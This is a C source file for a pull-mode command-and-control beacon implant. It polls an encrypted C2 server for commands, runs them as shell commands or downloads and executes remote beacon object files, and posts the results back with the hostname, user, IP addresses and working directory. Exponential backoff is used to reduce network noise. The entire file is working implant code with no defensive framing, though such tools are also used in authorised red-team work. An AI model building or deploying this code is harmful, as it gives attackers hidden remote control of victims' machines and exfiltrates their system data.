/*
 * beacon v1 - Canonical pull-mode beacon.
 *
 * This is the simplest beacon variant: it polls the C2 server for
 * commands, executes them (either shell commands or BOFs), and
 * reports the results back. All shared infrastructure (HTTP client,
 * crypto, BOF loader, output capture) lives in beacon_common.c.
 *
 * This beacon uses exponential backoff on failures to reduce noise
 * when the C2 is unreachable. The backoff resets on the first
 * successful command exchange.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>
#include <openssl/rand.h>
#include "beacon_common.h"
#include "cJSON.h"

static void report_result(const bsb_config_t *cfg,
                           const char *command,
                           const char *output) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname) - 1);
    struct passwd *pw = getpwuid(getuid());
    const char *user = pw ? pw->pw_name : "unknown";
    char *ips = get_local_ips();
    char *pwd = getcwd(NULL, 0);
    if (!pwd) pwd = strdup("/");

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "output", output);
    cJSON_AddStringToObject(root, "client", cfg->c2.client_id);
    cJSON_AddStringToObject(root, "command", command);
    cJSON_AddNumberToObject(root, "pid", (double)getpid());
    cJSON_AddStringToObject(root, "hostname", hostname);
    cJSON_AddStringToObject(root, "ips", ips);
    cJSON_AddStringToObject(root, "user", user);
    cJSON_AddStringToObject(root, "discovered_ips", "");
    cJSON_AddNullToObject(root, "result_portscan");
    cJSON_AddStringToObject(root, "result_pwd", pwd);

    char *json_str = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_str) {
        free(ips);
        free(pwd);
        return;
    }

    unsigned char iv_out[16];
    RAND_bytes(iv_out, 16);
    int encrypted_len = 0;
    unsigned char *encrypted_resp = aes256_cfb_encrypt(
        cfg->crypto.key, iv_out,
        (unsigned char*)json_str, strlen(json_str),
        &encrypted_len
    );

    if (encrypted_resp) {
        unsigned char *full_enc = malloc(16 + encrypted_len);
        memcpy(full_enc, iv_out, 16);
        memcpy(full_enc + 16, encrypted_resp, encrypted_len);
        char *b64_resp = base64_encode(full_enc, 16 + encrypted_len);

        if (b64_resp) {
            char report_url[BSB_MAX_URL + BSB_MAX_URI + 8192];
            snprintf(report_url, sizeof(report_url), "%s%s",
                     cfg->c2.url, cfg->c2.report_uri);
            size_t base_len = strlen(report_url);
            size_t b64_len = strlen(b64_resp);
            size_t enc_len = 0;
            char *b64_encoded = url_encode(b64_resp, b64_len, &enc_len);
            if (b64_encoded && base_len + enc_len + 1 <= sizeof(report_url)) {
                memcpy(report_url + base_len, b64_encoded, enc_len);
                report_url[base_len + enc_len] = '\0';
                http_response_t resp = https_request(cfg, report_url, "POST", NULL);
                free(resp.data);
                free(b64_encoded);
            }
            free(b64_resp);
        }
        free(full_enc);
        free(encrypted_resp);
    }

    free(json_str);
    free(ips);
    free(pwd);
}

static char *execute_command(const bsb_config_t *cfg, const char *command) {
    int output_len = 0;
    char *output = NULL;

    if (strncmp(command, "bof:", 4) == 0) {
        char *payload = strdup(command + 4);
        char *p = payload;
        while (*p == ' ') p++;

        char *space = strchr(p, ' ');
        char *bof_url;
        char *bof_args = "";
        int bof_arglen = 0;

        if (space) {
            *space = '\0';
            bof_url = p;
            bof_args = space + 1;
            if ((bof_args[0] == '"' || bof_args[0] == '\'') &&
                bof_args[0] == bof_args[strlen(bof_args)-1]) {
                bof_args[strlen(bof_args)-1] = '\0';
                bof_args++;
            }
            bof_arglen = strlen(bof_args);
        } else {
            bof_url = p;
        }

        size_t bof_size = 0;
        unsigned char *bof_data = download_bof(cfg, bof_url, &bof_size);
        if (!bof_data || bof_size == 0) {
            output = strdup("[!] Failed to download BOF");
        } else {
            output = run_bof_and_capture(bof_data, (uint32_t)bof_size,
                                          bof_args, bof_arglen, &output_len);
            free(bof_data);
        }
        free(payload);
    } else {
        output = exec_cmd(command, &output_len);
        if (!output) output = strdup("Command failed or no output");
    }

    if (!output) {
        output = strdup("");
    }
    return output;
}

int main(void) {
    srand(time(NULL));

    bsb_config_t cfg;
    char cfg_err[512] = {0};
    if (bsb_config_load_default(&cfg, cfg_err, sizeof(cfg_err)) != 0) {
        fprintf(stderr, "config error: %s\n", cfg_err);
        fprintf(stderr, "hint: run `make config` and `make`, then invoke ./build/beacon\n");
        return 1;
    }

    if (bsb_output_init(cfg.bof.output_buffer_size) != 0) {
        fprintf(stderr, "failed to allocate output buffer\n");
        return 1;
    }

    bsb_backoff_t backoff;
    bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);

    char full_url[BSB_MAX_URL + BSB_MAX_URI + BSB_MAX_CLIENT_ID];
    snprintf(full_url, sizeof(full_url), "%s%s%s",
             cfg.c2.url, cfg.c2.uri, cfg.c2.client_id);

    while (1) {
        http_response_t b64_resp = https_request(&cfg, full_url, "GET", NULL);
        if (!b64_resp.data || b64_resp.len == 0) {
            free(b64_resp.data);
            sleep(bsb_backoff_next(&backoff));
            continue;
        }

        int enc_len = 0;
        unsigned char *encrypted = base64_decode(b64_resp.data, &enc_len);
        free(b64_resp.data);

        if (!encrypted || enc_len < 16) {
            free(encrypted);
            sleep(bsb_backoff_next(&backoff));
            continue;
        }

        unsigned char *iv = encrypted;
        unsigned char *ciphertext = encrypted + 16;
        int plain_len = 0;
        char *plaintext = (char*)aes256_cfb_decrypt(
            cfg.crypto.key, iv, ciphertext, enc_len - 16, &plain_len
        );
        free(encrypted);

        if (!plaintext || strlen(plaintext) == 0) {
            free(plaintext);
            sleep(bsb_backoff_next(&backoff));
            continue;
        }

        bsb_backoff_reset(&backoff);

        char *output = execute_command(&cfg, plaintext);
        report_result(&cfg, plaintext, output);

        free(output);
        free(plaintext);

        sleep(bsb_config_sleep_seconds(&cfg));
    }

    bsb_output_cleanup();
    return 0;
}
